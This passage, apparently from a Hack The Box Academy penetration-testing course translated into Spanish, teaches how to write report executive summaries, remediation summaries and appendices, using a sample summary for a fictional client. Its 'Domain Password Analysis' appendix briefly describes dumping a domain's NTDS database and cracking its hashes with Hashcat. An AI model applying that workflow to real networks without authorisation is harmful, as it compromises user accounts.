- `If you're feeling brave and have a decent amount of experience on both sides, provide a general expectation for how much effort will be necessary to fix some of this.` - Si tienes un largo pasado como sysadmin o ingeniero y sabes cuánto política interna pueden tener que atravesar las personas para comenzar a manipular políticas de grupo, es posible que desees intentar establecer una expectativa de niveles bajos, moderados y significativos de tiempo y esfuerzo para corregir los problemas, para que un CEO demasiado entusiasta no vaya a decirle a su equipo de servidores que necesitan aplicar plantillas de endurecimiento de CIS a sus GPOs durante el fin de semana sin probarlas primero.
    

### Do Not

- `Name or recommend specific vendors.` - El entregable es un documento técnico, no un documento de ventas. Es aceptable sugerir tecnologías como EDR o log aggregation, pero mantente alejado de recomendar proveedores específicos de esas tecnologías, como CrowdStrike y Splunk. Si tienes experiencia con un proveedor en particular que sea reciente y te sientas cómodo dándole ese feedback al cliente, hazlo fuera de banda y asegúrate de dejar claro que deben tomar su propia decisión (y probablemente involucrar al account executive del cliente en esa discusión). Si estás describiendo vulnerabilidades específicas, es más probable que tu lector reconozca algo como "vendors like VMWare, Apache, and Adobe" en lugar de "vSphere, Tomcat, and Acrobat."
    
- `Use Acronyms.` - IP y VPN han alcanzado un nivel de ubicuidad que tal vez estén bien, pero usar acrónimos para protocolos y tipos de ataques (por ejemplo, SNMP, MitM) es insensible y hará que tu executive summary sea completamente ineficaz para su audiencia objetivo.
    
- `Spend more time talking about stuff that doesn't matter than you do about the significant findings in the report.` - Está en tu poder dirigir la atención. No la desperdicies en los problemas que descubriste que no fueron tan impactantes.
    
- `Use words that no one has ever heard of before.` - Tener un gran vocabulario es genial, pero si nadie puede entender el punto que intentas hacer o tienen que buscar qué significan las palabras, todo lo que son es una distracción. Muestra eso en otro lugar.
    
- `Reference a more technical section of the report.` - La razón por la que el ejecutivo está leyendo esto podría ser porque no entienden los detalles técnicos, o pueden decidir que simplemente no tienen tiempo para ello. Además, a nadie le gusta tener que desplazarse de un lado a otro en el reporte para averiguar qué está pasando.
    

### Vocabulary Changes

Para proporcionar algunos ejemplos de lo que significa "escribir para una audiencia no técnica," hemos proporcionado algunos ejemplos a continuación de términos técnicos y acrónimos que puedes estar tentado a usar, junto con una alternativa menos técnica que podría usarse en su lugar. Esta lista no es exhaustiva ni la "forma correcta" de describir estas cosas. Están destinados como ejemplos de cómo podrías describir un tema técnico de una manera más comprensible universalmente.

- `VPN, SSH` - un protocolo utilizado para administración remota segura
- `SSL/TLS` - tecnología utilizada para facilitar la navegación web segura
- `Hash` - el output de un algoritmo comúnmente utilizado para validar la integridad de archivos
- `Password Spraying` - un ataque en el que se intenta una única contraseña fácilmente adivinable para una gran lista de cuentas de usuario recopiladas
- `Password Cracking` - un ataque de contraseña offline en el que la forma criptográfica de la contraseña de un usuario se convierte nuevamente en su forma legible por humanos
- `Buffer overflow/deserialization/etc.` - un ataque que resultó en remote command execution en el host objetivo
- `OSINT` - Open Source Intelligence Gathering, o búsqueda/uso de datos sobre una empresa y sus empleados que pueden encontrarse utilizando motores de búsqueda y otras fuentes públicas sin interactuar con la red externa de la empresa
- `SQL injection/XSS` - una vulnerabilidad en la que se acepta entrada del usuario sin sanitizar caracteres destinados a manipular la lógica de la aplicación de manera no intencionada

Estos son solo algunos ejemplos. Tu glosario crecerá con el tiempo a medida que escribas más reportes. También puedes mejorar en esta área leyendo los executive summaries que otros han escrito describiendo algunos de los mismos hallazgos que sueles descubrir. Hacerlo puede ser el catalizador para pensar en algo de una manera diferente. También puedes recibir feedback del cliente de vez en cuando sobre esto, y es importante recibir este feedback con gracia y con una mente abierta. Puedes estar tentado a ponerte a la defensiva (especialmente si el cliente está siendo muy agresivo), pero al final del día, te pagaron para construirles un producto útil. Si no lo es porque no pueden entenderlo, entonces míralo como una oportunidad para practicar y crecer. Tomar el feedback del cliente como un ataque personal puede ser difícil de no hacer, pero es una de las cosas más valiosas que pueden darte.

---

## Example Executive Summary

A continuación se muestra un ejemplo de executive summary que fue tomado del reporte de muestra incluido con este módulo:

Durante el internal penetration test contra Inlanefreight, Hack The Box Academy identificó siete (7) hallazgos que amenazan la confidencialidad, integridad y disponibilidad de los sistemas de información de Inlanefreight. Los hallazgos fueron categorizados por nivel de severidad, con cinco (5) de los hallazgos asignados a un high-risk rating, uno (1) a un medium-risk, y uno (1) a un low risk. También hubo un (1) hallazgo informativo relacionado con la mejora de las capacidades de monitoreo de seguridad dentro de la red interna.

El tester encontró que la gestión de parches y vulnerabilidades de Inlanefreight estaba bien mantenida. Ninguno de los hallazgos en este reporte estaba relacionado con parches faltantes del sistema operativo o aplicaciones de terceros de vulnerabilidades conocidas en servicios y aplicaciones que podrían resultar en acceso no autorizado y compromiso del sistema. Cada falla descubierta durante las pruebas estaba relacionada con una mala configuración o falta de endurecimiento, con la mayoría cayendo bajo las categorías de autenticación débil y autorización débil.

Un hallazgo involucraba un protocolo de comunicación de red que puede ser "suplantado" para recuperar contraseñas de usuarios internos que pueden usarse para obtener acceso no autorizado si un atacante puede obtener acceso no autorizado a la red sin credenciales. En la mayoría de los entornos corporativos, este protocolo es innecesario y puede deshabilitarse. Está habilitado por defecto principalmente para pequeñas y medianas empresas que no tienen los recursos para un servidor dedicado de resolución de nombres de host (el "directorio telefónico" de tu red). Durante la evaluación, se observaron estos recursos en la red, por lo que Inlanefreight debería comenzar a formular un plan de prueba para deshabilitar el servicio peligroso.

El siguiente problema fue una configuración débil que involucraba cuentas de servicio que permite a cualquier usuario autenticado robar un componente del proceso de autenticación que a menudo puede adivinarse offline (mediante "password cracking") para revelar la forma legible por humanos de la contraseña de la cuenta. Este tipo de cuentas de servicio típicamente tienen más privilegios que un usuario estándar, por lo que obtener una de sus contraseñas en texto claro podría resultar en movimiento lateral o escalada de privilegios y eventualmente en un compromiso completo de la red interna. El tester también notó que la misma contraseña se usó para el acceso de administrador en todos los servidores dentro de la red interna. Esto significa que si un servidor es comprometido, un atacante puede reutilizar esta contraseña para acceder a cualquier servidor que la comparta para acceso administrativo. Afortunadamente, ambos problemas pueden corregirse sin necesidad de herramientas de terceros. El Active Directory de Microsoft contiene configuraciones que pueden utilizarse para minimizar el riesgo de que estos recursos sean abusados en beneficio de usuarios maliciosos.

También se encontró un servidor web que ejecutaba una aplicación web que usaba credenciales débiles y fácilmente adivinables para acceder a una consola administrativa que puede ser aprovechada para obtener acceso no autorizado al servidor subyacente. Esto podría ser explotado por un atacante en la red interna sin necesidad de una cuenta de usuario válida. Este ataque está muy bien documentado, por lo que es un objetivo extremadamente probable que puede ser particularmente dañino, incluso en manos de un atacante sin experiencia. Idealmente, el acceso directo externo a este servicio debería deshabilitarse, pero en caso de que no se pueda, debería reconfigurarse con credenciales excepcionalmente fuertes que se roten frecuentemente. Inlanefreight también puede considerar maximizar los datos de logs recopilados de este dispositivo para asegurar que los ataques contra él puedan ser detectados y evaluados rápidamente.

El tester también encontró carpetas compartidas con permisos excesivos, lo que significa que todos los usuarios en la red interna pueden acceder a una cantidad considerable de datos. Si bien compartir archivos internamente entre departamentos y usuarios es importante para las operaciones diarias del negocio, permisos abiertos en carpetas compartidas pueden resultar en la divulgación no intencionada de información confidencial. Incluso si

 una carpeta compartida no contiene información sensible hoy, alguien puede poner inadvertidamente tal información allí, pensando que está protegida cuando no lo está. Esta configuración debería cambiarse para asegurar que los usuarios solo puedan acceder a lo que es necesario para realizar sus tareas diarias.

Finalmente, el tester notó que las actividades de prueba parecían pasar mayormente desapercibidas, lo que puede representar una oportunidad para mejorar la visibilidad en la red interna e indica que un atacante real podría permanecer sin ser detectado si se logra acceso interno. Inlanefreight debería crear un plan de remediación basado en la sección de Remediation Summary de este reporte, abordando todos los hallazgos de alta prioridad tan pronto como sea posible según las necesidades del negocio. Inlanefreight también debería considerar realizar evaluaciones de vulnerabilidad periódicas si no se están realizando ya. Una vez que se hayan abordado los problemas identificados en este reporte, una evaluación de seguridad de Active Directory más colaborativa y en profundidad puede ayudar a identificar oportunidades adicionales para endurecer el entorno de Active Directory, haciendo más difícil para los atacantes moverse por la red y aumentando la probabilidad de que Inlanefreight pueda detectar y responder a actividades sospechosas.

### Anatomy of the Executive Summary

Esa pared de texto es genial y todo, pero ¿cómo llegamos allí? Echemos un vistazo al proceso de pensamiento, ¿de acuerdo? Para este análisis, utilizaremos el reporte de muestra que puedes descargar de la lista de `Resources`.

Lo primero que probablemente querrás hacer es obtener una lista de tus hallazgos y tratar de categorizar la naturaleza del riesgo de cada uno. Estas categorías serán la base para lo que vas a discutir en el executive summary. En nuestro reporte de muestra, tenemos los siguientes hallazgos:

- LLMNR/NBT-NS Response Spoofing - `configuration change/system hardening`
- Weak Kerberos Authentication (“Kerberoasting”) - `configuration change/system hardening`
- Local Administrator Password Re-Use - `behavioral/system hardening`
- Weak Active Directory Passwords - `behavioral`
- Tomcat Manager Weak/Default Credentials High - `configuration change/system hardening`
- Insecure File Shares - `configuration change/system hardening/permissions`
- Directory Listing Enabled - `configuration change/system hardening`
- Enhance Security Monitoring Capabilities - `configuration change/system hardening`

Primero, es notable que no hay problemas en esta lista vinculados a parches faltantes, lo que indica que el cliente puede haber pasado un tiempo y esfuerzo considerables madurando ese proceso. Para cualquiera que haya sido sysadmin antes, sabrás que esto no es una hazaña pequeña, por lo que queremos asegurarnos de reconocer sus esfuerzos. Esto te acerca al equipo de sysadmin al mostrar a sus ejecutivos que el trabajo que han estado haciendo ha sido efectivo, y alienta a los ejecutivos a seguir invirtiendo en personas y tecnología que pueden ayudar a corregir algunos de sus problemas.

De vuelta a nuestros hallazgos, puedes ver que casi todos los hallazgos tienen algún tipo de cambio de configuración o resolución de endurecimiento del sistema. Para colapsarlo aún más, podrías empezar a concluir que este cliente en particular tiene un proceso de gestión de configuración inmaduro (es decir, no hacen un buen trabajo cambiando configuraciones predeterminadas en nada antes de ponerlo en producción). Dado que hay mucho que desempacar en ocho hallazgos, probablemente no querrás simplemente escribir un párrafo que diga "configure things better." Tienes algo de espacio para profundizar en algunos problemas individuales y describir algunos de los impactos (las cosas que llaman la atención) de algunos de los hallazgos más dañinos. Desarrollar un proceso de gestión de configuración llevará mucho trabajo, por lo que es importante describir lo que sucedió o podría suceder si este problema permanece sin resolver.

A medida que lees cada párrafo, probablemente podrás mapear la descripción de alto nivel al hallazgo asociado para darte una idea de cómo describir algunos de los términos técnicos de una manera que una audiencia no técnica pueda seguir sin tener que buscar cosas. Notarás que no usamos acrónimos, hablamos de protocolos, mencionamos tickets que otorgan otros tickets, o algo por el estilo. En algunos casos, también describimos anécdotas generales sobre el nivel de esfuerzo esperado para la remediación, cambios que deberían hacerse con precaución, soluciones alternativas para monitorear una amenaza dada y el nivel de habilidad requerido para realizar la explotación. NO tienes que tener un párrafo para cada hallazgo. Si tienes un reporte con 20 hallazgos, eso se saldría de control rápidamente. Trata de enfocarte en los más impactantes.

Un par de matices a mencionar también:

- Ciertas observaciones que haces durante la evaluación pueden indicar un problema mayor que el cliente puede no ser consciente. Es obviamente valioso proporcionar este análisis, pero debes tener cuidado con cómo está redactado para asegurar que no estás hablando en absolutos debido a una suposición.
- Al final, notarás un párrafo sobre cómo **parece que** y **indicó que** el cliente no detectó nuestras actividades de prueba. Estos calificadores son importantes porque no estás absolutamente seguro de que no lo hicieron. Pueden simplemente no haberte dicho que lo hicieron.
- Otro ejemplo de esto (en general, no en este executive summary) sería si escribieras algo en el sentido de "comenzar a documentar plantillas y procesos de endurecimiento del sistema." Esto insinúa que no han hecho nada, lo que podría ser insultante si realmente intentaron y fallaron. En su lugar, podrías decir "revisar los procesos de gestión de configuración y abordar las brechas que llevaron a los problemas identificados en este reporte."

Espero que esto ayude a aclarar algunos de los procesos de pensamiento que se utilizaron para escribir esto y te dé algunas ideas sobre cómo pensar en las cosas de manera diferente al intentar describirlas. Las palabras tienen significado, así que asegúrate de elegirlas con cuidado.

---

## Summary of Recommendations

Antes de entrar en los hallazgos técnicos, es una buena idea proporcionar un `Summary of Recommendations` o `Remediation Summary`. Aquí podemos enumerar nuestras recomendaciones a corto, mediano y largo plazo basadas en nuestros hallazgos y el estado actual del entorno del cliente. Necesitaremos usar nuestra experiencia y conocimiento del negocio del cliente, presupuesto de seguridad, consideraciones de personal, etc., para hacer recomendaciones precisas. Nuestros clientes a menudo tendrán input en esta sección, por lo que queremos hacerlo bien, o las recomendaciones serán inútiles. Si estructuramos esto correctamente, nuestros clientes pueden usarlo como base para una hoja de ruta de remediación. Si optas por no hacer esto, prepárate para que los clientes te pidan que priorices la remediación por ellos. Puede no suceder todo el tiempo, pero si tienes un reporte con 15 hallazgos de alto riesgo y nada más, es probable que quieran saber cuál de ellos es "el más alto." Como dice el refrán, "cuando todo es importante, nada es importante."

Deberíamos vincular cada recomendación a un hallazgo específico y no incluir ninguna recomendación a corto o mediano plazo que no sea accionable al remediar hallazgos reportados más adelante en el reporte. Las recomendaciones a largo plazo pueden mapearse a recomendaciones informativas/mejores prácticas, como `"Crear plantillas de seguridad base para hosts de Windows Server y Workstation"` pero también pueden ser recomendaciones generales como `"Realizar evaluaciones periódicas de ingeniería social con sesiones de retroalimentación y capacitación en concienciación de seguridad para construir una cultura centrada en la seguridad dentro de la organización desde arriba hacia abajo."`

Algunos hallazgos podrían tener una recomendación a corto y largo plazo asociada. Por ejemplo, si un parche en particular falta en muchos lugares, eso es un signo de que la organización tiene dificultades con la gestión de parches y quizás no tenga un programa sólido de gestión de parches, junto con políticas y procedimientos asociados. La solución a corto plazo sería implementar los parches relevantes, mientras que el objetivo a largo plazo sería revisar los procesos de gestión de parches y vulnerabilidades para abordar cualquier brecha que evitaría que el mismo problema vuelva a surgir. En el mundo de la seguridad de aplicaciones, podría ser en su lugar arreglar el código a corto plazo y a largo plazo, revisar el SDLC para asegurar que la seguridad se considere lo suficientemente temprano en el proceso de desarrollo para evitar que estos problemas lleguen a producción.

---

## Findings

Después del Executive Summary, la sección de `Findings` es una de las más importantes. Esta sección nos da la oportunidad de mostrar nuestro trabajo, pintar al cliente un panorama del riesgo para su entorno, proporcionar a los equipos técnicos la evidencia para validar y reproducir los problemas y ofrecer consejos de remediación. Discutiremos esta sección del reporte en detalle en la siguiente sección de este módulo: [How to Write up a Finding](https://academy.hackthebox.com/module/162/section/1536).

---

## Appendices

Hay apéndices que deberían aparecer en cada reporte, pero otros serán dinámicos y pueden no ser necesarios para todos los reportes. Si alguno de estos apéndices infla el tamaño del reporte innecesariamente, puede que quieras considerar si una hoja de cálculo suplementaria sería una mejor manera de presentar los datos (sin mencionar la capacidad mejorada de ordenar y filtrar).

---

## Static Appendices

### Scope

Muestra el alcance de la evaluación (URLs, rangos de red, instalaciones, etc.). La mayoría de los auditores a los que el cliente tiene que entregar tu reporte necesitarán ver esto.

### Methodology

Explica el proceso repetible que sigues para asegurar que tus evaluaciones sean exhaustivas y consistentes.

###

 Severity Ratings

Si tus ratings de severidad no se mapear directamente a una puntuación CVSS o algo similar, necesitarás articular los criterios necesarios para cumplir con tus definiciones de severidad. Tendrás que defender esto ocasionalmente, así que asegúrate de que sea sólido y pueda respaldarse con lógica y que los hallazgos que incluyas en tu reporte estén calificados en consecuencia.

### Biographies

Si realizas evaluaciones con la intención de cumplir específicamente con PCI, el reporte debería incluir una biografía sobre el personal que realiza la evaluación con el objetivo específico de articular que el consultor está adecuadamente calificado para realizar la evaluación. Incluso sin obligaciones de cumplimiento, puede ayudar a dar tranquilidad al cliente de que la persona que realiza su evaluación sabía lo que estaba haciendo.

---

## Dynamic Appendices

### Exploitation Attempts and Payloads

Si alguna vez has hecho algo en respuesta a incidentes, deberías saber cuántos artefactos quedan después de un penetration test para que los chicos de forensics intenten cribar. Sé respetuoso y lleva un registro de las cosas que hiciste para que si experimentan un incidente, puedan diferenciar lo que fuiste tú versus un atacante real. Si generas payloads personalizados, especialmente si los dejas en disco, también deberías incluir los detalles de esos payloads aquí, para que el cliente sepa exactamente a dónde ir y qué buscar para deshacerse de ellos. Esto es especialmente importante para payloads que no puedes limpiar tú mismo.

### Compromised Credentials

Si se comprometió un gran número de cuentas, es útil enumerarlas aquí (si comprometes todo el dominio, podría ser un esfuerzo desperdiciado enumerar cada cuenta de usuario en lugar de simplemente decir "todas las cuentas de dominio") para que el cliente pueda tomar medidas contra ellas si es necesario.

### Configuration Changes

Si hiciste algún cambio de configuración en el entorno del cliente (esperemos que hayas preguntado primero), deberías enumerar todos ellos para que el cliente pueda revertirlos y eliminar cualquier riesgo que hayas introducido en el entorno (como deshabilitar EDR o algo). Obviamente, lo ideal es que pongas las cosas como las encontraste tú mismo y obtengas la aprobación por escrito del cliente para cambiar cosas para evitar que te griten más tarde si tu cambio tiene consecuencias no deseadas para un proceso generador de ingresos.

### Additional Affected Scope

Si tienes un hallazgo con una lista de hosts afectados que sería demasiado para incluir con el hallazgo en sí, generalmente puedes referenciar un apéndice en el hallazgo para ver una lista completa de los hosts afectados donde puedes crear una tabla para mostrarlos en múltiples columnas. Esto ayuda a mantener el reporte limpio en lugar de tener una lista con viñetas de varias páginas.

### Information Gathering

Si la evaluación es un External Penetration test, podemos incluir datos adicionales para ayudar al cliente a comprender su huella externa. Esto podría incluir datos whois, información de propiedad de dominio, subdominios, correos electrónicos descubiertos, cuentas encontradas en datos de brechas públicas ([DeHashed](https://www.dehashed.com/) es excelente para esto), un análisis de las configuraciones de SSL/TLS del cliente e incluso una lista de puertos/servicios accesibles externamente (en un external scope grande probablemente querrías hacer una hoja de cálculo suplementaria). Estos datos pueden ser muy útiles en un reporte de pocos hallazgos, pero deben transmitir algún tipo de valor al cliente y no ser solo "relleno".

### Domain Password Analysis

Si puedes obtener acceso de Domain Admin y descargar la base de datos NTDS, es una buena idea ejecutar esto a través de Hashcat con múltiples listas de palabras y reglas e incluso brute-force NTLM hasta ocho caracteres si tu equipo de cracking de contraseñas es lo suficientemente potente. Una vez que hayas agotado tus intentos de crackeo, una herramienta como [DPAT](https://github.com/clr2of8/DPAT) puede utilizarse para producir un bonito reporte con varias estadísticas. Puedes querer solo incluir algunas estadísticas clave de este reporte (es decir, número de hashes obtenidos, número y porcentaje crackeado, número de cuentas privilegiadas crackeadas (piensa en Domain Admins y Enterprise Admins), las X contraseñas principales y el número de contraseñas crackeadas para cada longitud de caracteres). Esto puede ayudar a reforzar temas en las secciones de Executive Summary y Findings respecto a contraseñas débiles. También puedes querer proporcionar al cliente el reporte completo de DPAT como datos suplementarios.

---

## Report Type Differences

En este módulo, estamos cubriendo principalmente todos los elementos que deberían incluirse en un Internal Penetration Test report o en un External Penetration Test que terminó con compromiso interno. Algunos de los elementos del reporte (como la Attack Chain) probablemente no aplicarán en un External Penetration Test report donde no hubo compromiso interno. Este tipo de reporte se centraría más en la recolección de información, datos de OSINT y servicios expuestos externamente. Probablemente no incluiría apéndices como credenciales comprometidas, cambios de configuración o un análisis de contraseñas del dominio. Un Web Application Security Assessment (WASA) report probablemente se centraría principalmente en las secciones de Executive Summary y Findings y enfatizaría el OWASP Top 10. Una evaluación de seguridad física, una red team assessment o una social engineering engagement se escribirían en un formato más narrativo. Es una buena práctica crear plantillas para varios tipos de evaluaciones, para tenerlas listas cuando surja ese tipo de evaluación.

Ahora que hemos cubierto los elementos de un reporte, vamos a profundizar en cómo redactar efectivamente un hallazgo.